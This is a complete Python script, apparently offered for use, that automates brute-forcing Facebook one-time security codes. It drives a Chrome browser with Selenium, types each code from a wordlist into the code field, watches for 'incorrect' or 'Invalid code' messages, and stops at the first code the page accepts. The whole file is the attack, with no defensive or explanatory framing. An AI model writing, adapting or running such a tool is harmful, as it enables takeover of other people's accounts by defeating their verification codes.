from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
import sys
import re

def load_wordlist(file_path):
    with open(file_path, "r") as file:
        return file.readlines()

def enter_security_code(driver, code):
    try:
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'input[placeholder="Enter code"]'))
        )
        input_field = driver.find_element(By.CSS_SELECTOR, 'input[placeholder="Enter code"]')
        input_field.clear()
        input_field.send_keys(code)
        input_field.send_keys(Keys.RETURN)
        return True
    except (NoSuchElementException, TimeoutException) as e:
        print(f"Error entering code {code}: {e}")
        return False

def check_code_result(driver):
    try:
        # Check for error message indicating a wrong code
        error_message = WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'incorrect') or contains(text(), 'Invalid code') or contains(text(), 'didn’t match')]"))
        ).text
        return False if error_message else True
    except TimeoutException:
        # If no error message is found within the timeout, assume success
        return True

def validate_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # ...or ipv4
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'  # ...or ipv6
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

if __name__ == "__main__":
    wordlist = load_wordlist("wordlist.txt")  # Load wordlist from file

    url = input("Enter the URL of the Facebook OTP page:\n> ")

    if not validate_url(url):
        print("Invalid URL. Please enter a valid URL starting with http:// or https://")
        sys.exit(1)

    driver = webdriver.Chrome(ChromeDriverManager().install())
    driver.get(url)  # Navigate to the provided URL

    # Iterate over each code in the wordlist
    for code in wordlist:
        code = code.strip()
        print(f"Trying {code}")
        sys.stdout.flush()
        if enter_security_code(driver, code):
            if check_code_result(driver):
                print(f"{code} matched")
                break

    driver.quit()
